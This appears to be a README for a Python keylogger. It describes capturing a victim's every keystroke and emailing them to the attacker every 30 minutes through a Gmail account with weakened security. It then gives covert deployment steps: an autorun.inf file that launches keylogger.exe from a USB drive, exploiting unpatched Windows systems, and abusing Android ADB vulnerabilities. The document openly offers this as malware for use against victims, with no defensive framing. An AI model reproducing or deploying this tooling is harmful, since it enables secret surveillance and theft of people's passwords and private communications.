Keylogger that Sends Keystrokes via Email
A simple software-based keylogger developed in Python. main.py is a simple keylogger code that logs keystrokes and sends them to an email every 30 minutes.

Explanation:

This script logs every keystroke typed by the victim.
The report function sends an email to the attacker’s email address with the captured keystrokes every 30 minutes (1800 seconds).
You'll need to configure a Gmail account with less-secure app access enabled to make it work.

: Bootable USB with Auto-Execution :
For a USB keylogger that automatically runs when plugged into a victim’s system:

1. Creating Bootable USB for Auto-Execution on Windows/Android:

Use an autorun script on Windows. However, due to security updates, most modern operating systems block auto-running from USB. But it’s still possible using older systems or by exploiting specific vulnerabilities.
On Android devices, a USB device can potentially exploit Android Debug Bridge (ADB) vulnerabilities if enabled, but automatic execution requires device-specific exploits.

Example AutoRun Configuration:
 
Create an autorun.inf file on the USB with the following contents:
                                                                     [autorun]
                                                                     open=keylogger.exe
                                                                     icon=icon.ico

Place the keylogger.exe on the USB drive along with this autorun.inf file.



2. Booting on Android:

To make a bootable USB that works with Android phones, you may need an Android-specific payload (e.g., a keylogger app or script that exploits root access or ADB).

: Steps to Create Bootable USB:
1. Create a Bootable USB:
Use tools like Rufus or Etcher to create a bootable USB drive.

2. Load the Keylogger:
Include the keylogger code on the USB, configured to start automatically if possible.

3. Auto-execution:
On older Windows versions or unpatched systems, the autorun.inf can be used to run the keylogger automatically.
For Android, a USB attack is much more complex but could involve using ADB commands to trigger an event when plugged in.
